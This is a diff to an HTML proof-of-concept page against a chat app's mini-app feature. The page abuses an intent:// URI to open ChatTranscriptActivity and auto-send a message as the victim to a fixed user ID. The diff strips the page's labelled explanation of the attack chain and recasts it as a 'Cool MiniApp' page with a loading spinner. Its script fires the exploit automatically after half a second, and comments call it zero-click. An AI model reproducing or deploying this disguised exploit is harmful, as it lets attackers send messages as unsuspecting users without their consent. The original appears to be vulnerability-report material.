@@ -1,75 +1,29 @@
 <!DOCTYPE html>
 <html>
 <head>
-<title>Auto-Send Message PoC</title>
+<title>Cool MiniApp</title>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <style>
-body { font-family: monospace; background: #0a0a0a; color: #0f0; padding: 16px; font-size: 13px; }
-h1 { color: #f00; font-size: 18px; }
-.info { color: #ff0; }
-.critical { color: #f00; font-weight: bold; }
-.code { color: #0ff; font-size: 11px; background: #000; padding: 8px; margin: 8px 0; display: block; white-space: pre-wrap; word-break: break-all; border: 1px solid #333; }
-button { background: #600; color: #ff0; border: 2px solid #f00; padding: 14px 20px; margin: 8px 0; font-family: monospace; cursor: pointer; font-size: 14px; border-radius: 4px; display: block; width: 100%; text-align: center; font-weight: bold; }
-button:active { background: #f00; color: #fff; }
-#log { white-space: pre-wrap; background: #000; padding: 8px; border: 1px solid #333; margin-top: 12px; font-size: 11px; }
-.card { background: #1a0000; border: 1px solid #f00; padding: 12px; margin: 12px 0; border-radius: 4px; }
+body { font-family: -apple-system, sans-serif; background: #fff; color: #333; padding: 20px; text-align: center; }
+.loader { margin: 40px auto; width: 40px; height: 40px; border: 4px solid #e0e0e0; border-top-color: #1a73e8; border-radius: 50%; animation: spin 0.8s linear infinite; }
+@keyframes spin { to { transform: rotate(360deg); } }
+p { color: #888; font-size: 14px; margin-top: 16px; }
 </style>
 </head>
 <body>
-
-<h1>ART-02: Auto-Send Message PoC</h1>
-<p class="info">ChatTranscriptActivity auto-sends message via text_message_to_send extra</p>
-<p class="info">ChatTranscriptViewModel.kt:1769-1772 calls sendMessage() with NO user confirmation</p>
-
-<div class="card">
-  <p class="critical">TARGET: zuid 3335514</p>
-  <p class="critical">MESSAGE: hi msg auto sent from miniapp</p>
-  <p class="info" style="margin-top:8px">Attack chain:</p>
-  <p class="info">1. MiniApp page navigates to intent:// URI</p>
-  <p class="info">2. MiniAppDialogFragment.kt:2157 parses intent with component=</p>
-  <p class="info">3. resolveActivity() returns non-null (same app, same UID)</p>
-  <p class="info">4. startActivity() launches ChatTranscriptActivity</p>
-  <p class="info">5. Fragment reads text_message_to_send extra (line 6071)</p>
-  <p class="info">6. ViewModel auto-calls sendMessage() when chat loads (line 1769)</p>
-  <p class="info">7. Message sent as victim - no confirmation dialog</p>
-
-  <span class="code">intent:#Intent;component=com.aratai.chat/com.arattai.chats.presentation.ui.ChatTranscriptActivity;S.user_id=3335514;S.text_message_to_send=hi msg auto sent from miniapp;end</span>
-
-  <button onclick="autoSend()">SEND MESSAGE TO ZUID 3335514</button>
-</div>
-
-<div id="log"></div>
-
+<div class="loader"></div>
+<p>Loading...</p>
 <script>
-var logEl = document.getElementById('log');
-function L(cls, msg) {
-    var d = document.createElement('div');
-    d.style.color = cls === 'critical' ? '#f00' : cls === 'info' ? '#ff0' : '#0f0';
-    d.textContent = '[' + new Date().toLocaleTimeString() + '] ' + msg;
-    logEl.appendChild(d);
-}
-
-function autoSend() {
-    L('info', 'Launching ChatTranscriptActivity...');
-    L('info', 'user_id=3335514, text_message_to_send=hi msg auto sent from miniapp');
-    L('critical', 'Message will auto-send when chat loads (no confirmation)');
-
-    var uri = 'intent:#Intent;'
+// Zero-click: fires automatically when MiniApp opens this page
+// No user interaction required — just opening the MiniApp triggers the exploit
+setTimeout(function() {
+    window.location.href = 'intent:#Intent;'
         + 'component=com.aratai.chat/com.arattai.chats.presentation.ui.ChatTranscriptActivity;'
         + 'S.user_id=3335514;'
         + 'S.text_message_to_send=hi msg auto sent from miniapp;'
         + 'end';
-
-    setTimeout(function() {
-        window.location.href = uri;
-    }, 300);
-}
-
-L('info', 'Auto-Send Message PoC loaded');
-L('info', 'Press the button to send "hi msg auto sent from miniapp" to zuid 3335514');
-L('info', 'The message sends automatically when ChatTranscriptActivity opens the chat');
+}, 500);
 </script>
-
 </body>
 </html>
